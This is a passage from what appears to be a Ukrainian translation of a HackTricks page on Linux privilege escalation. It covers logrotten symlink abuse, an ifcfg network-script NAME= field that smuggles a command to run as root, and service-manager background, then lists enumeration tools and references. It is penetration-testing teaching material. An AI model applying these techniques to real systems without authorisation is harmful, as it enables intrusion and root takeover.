Ви можете експлуатувати цю уразливість за допомогою [**logrotten**](https://github.com/whotwagner/logrotten).

Ця уразливість дуже схожа на [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(журнали nginx),** тому щоразу, коли ви виявляєте, що можете змінювати журнали, перевірте, хто керує цими журналами, і перевірте, чи можете ви підвищити привілеї, замінивши журнали на символічні посилання.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Посилання на уразливість:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Якщо з якоїсь причини користувач може **записати** скрипт `ifcf-<whatever>` у _/etc/sysconfig/network-scripts_ **або** може **відредагувати** існуючий, то ваша **система зламано**.

Мережеві скрипти, наприклад, _ifcg-eth0_ використовуються для мережевих з'єднань. Вони виглядають точно так само, як .INI файли. Однак вони \~підключаються\~ на Linux через Network Manager (dispatcher.d).

У моєму випадку атрибут `NAME=` в цих мережевих скриптах не обробляється належним чином. Якщо у вас є **пробіли в імені, система намагається виконати частину після пробілу**. Це означає, що **все після першого пробілу виконується як root**.

Наприклад: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
### **init, init.d, systemd, та rc.d**

Директорія `/etc/init.d` є домом для **скриптів** для System V init (SysVinit), **класичної системи управління сервісами Linux**. Вона містить скрипти для `start`, `stop`, `restart`, а іноді `reload` сервісів. Ці скрипти можуть виконуватись безпосередньо або через символічні посилання, що знаходяться в `/etc/rc?.d/`. Альтернативний шлях у системах Redhat - це `/etc/rc.d/init.d`.

З іншого боку, `/etc/init` пов'язаний з **Upstart**, новішою **системою управління сервісами**, введеною Ubuntu, яка використовує конфігураційні файли для завдань управління сервісами. Незважаючи на перехід на Upstart, скрипти SysVinit все ще використовуються разом з конфігураціями Upstart через шар сумісності в Upstart.

**systemd** виникає як сучасний менеджер ініціалізації та сервісів, пропонуючи розширені функції, такі як запуск демонів за запитом, управління автоматичним монтуванням та знімки стану системи. Він організовує файли в `/usr/lib/systemd/` для дистрибутивних пакетів та `/etc/systemd/system/` для модифікацій адміністратора, спрощуючи процес адміністрування системи.

## Інші трюки

### Підвищення привілеїв NFS

{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Вихід з обмежених оболонок

{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage

{{#ref}}
cisco-vmanage.md
{{#endref}}

## Захисти безпеки ядра

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Більше допомоги

[Статичні бінарники impacket](https://github.com/ropnop/impacket_static_binaries)

## Інструменти Privesc для Linux/Unix

### **Найкращий інструмент для пошуку векторів підвищення локальних привілеїв Linux:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Перерахувати вразливості ядра в linux та MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (фізичний доступ):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Збірка більше скриптів**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Посилання

- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)

{{#include ../../banners/hacktricks-training.md}}
